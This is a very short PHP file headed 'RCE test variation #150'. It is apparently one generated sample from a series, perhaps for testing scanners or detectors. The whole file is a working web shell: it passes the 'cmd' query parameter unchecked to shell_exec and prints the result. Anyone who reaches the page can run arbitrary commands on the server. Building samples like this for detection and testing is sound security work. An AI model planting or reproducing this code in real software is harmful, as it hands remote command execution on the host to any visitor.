<?php
// RCE test variation #150
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>